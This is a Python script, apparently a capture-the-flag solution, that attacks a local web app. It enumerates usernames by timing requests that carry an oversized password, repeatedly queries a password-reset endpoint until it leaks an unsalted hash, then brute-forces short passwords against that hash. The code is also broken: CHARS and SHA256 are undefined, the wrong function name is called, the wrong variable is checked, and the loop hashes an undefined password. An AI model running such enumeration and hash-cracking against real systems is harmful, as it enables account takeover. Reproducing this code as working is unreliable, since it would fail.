import requests
import time
import itertools
import string

BASE_IP_PORT = "127.0.0.1:32708" #don't forget to change this
FLAG_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/flag"
FORGET_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/forgetpass"

BIG_PASSWORD = "A" * 4096

def check_username(username_guess):
    params = {
        "username": username_guess,
        "password": BIG_PASSWORD
    }

    start = time.perf_counter()
    try:
        r = requests.get(FLAG_ENDPOINT, params=params, timeout=3) #adjust timeout based on your feelings
        elapsed = time.perf_counter() - start
        return elapsed, r.text
    except Exception as e:
        return None, str(e)

def find_username():
    for tup in itertools.product(CHARS, repeat=4): #AI assisted with how to use itertools, I didn't know how to enumerate through usernames using python
        u = "".join(tup)
        elapsed = try_username(u)

        if elapsed is None:
            return u
    return None
username = ""
def retrieve_unsalted_hash():
    global username
    username = find_username()
    if username is None:
        return None


    for i in range(10000):
        try:
            r = requests.get(FORGET_ENDPOINT, params={"username": username})
            data = r.json()
            if "UnsaltedPasswordHash" in data:
                return data["UnsaltedPasswordHash"]
        except:
            data = {}
    return None

HASH = retrieve_unsalted_hash()
if(hash == None):
    exit()
for tup in itertools.product(CHARS, repeat=3): 
    u = "".join(tup)
    if HASH == SHA256.new(data=password.encode()).hexdigest():
        print(username, u);


